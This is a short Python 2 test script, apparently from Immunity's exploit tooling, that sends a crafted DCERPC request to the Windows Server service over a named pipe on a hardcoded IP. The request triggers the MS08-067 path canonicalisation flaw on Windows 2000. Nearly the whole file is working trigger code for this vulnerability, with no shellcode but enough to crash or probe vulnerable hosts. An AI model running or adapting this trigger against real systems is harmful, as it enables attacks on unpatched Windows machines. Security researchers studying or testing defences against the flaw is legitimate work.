#!/usr/bin/env python
##ImmunityHeader v1
###############################################################################
## File       :  testdcerpc.py
## Description:
##            :
## Created_On :  Tue Jul 13 09:28:30 2010
## Created_By :  Kostya Kortchinsky
## Modified_On:  Tue Oct 26 10:29:52 2010
## Modified_By:  Kostya Kortchinsky
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
###############################################################################

import sys
from struct import pack

if '.' not in sys.path:
    sys.path.append('.')

from libs.newsmb.libdcerpc import DCERPC, DCERPCString


print '***** Testing Windows 2000 Trigger for MS08-067 *****'

path = u'A\\..\\..\\'.encode('UTF-16LE')
mark = len(path)

path += u'\0'.encode('UTF-16LE')
data =''
data += pack('<L', 1)
data += DCERPCString(string = u'EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE'.encode('UTF-16LE')).pack()
data += '\0\0'
data += DCERPCString(string = path).pack()
data += '\0\0'
data += pack('<L', 2)
data += DCERPCString(string = u'\\'.encode('UTF-16LE')).pack()
data += pack('<LL', 1, 1)

dce = DCERPC(u'ncacn_np:192.168.2.107[\\browser]', getsock=None)
#dce.max_dcefrag = 100
dce.bind(u'4b324fc8-1670-01d3-1278-5a47bf6ee188', u'3.0') #, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
dce.call(0x1f, data, response=True)
print dce.reassembled_data.encode('hex')
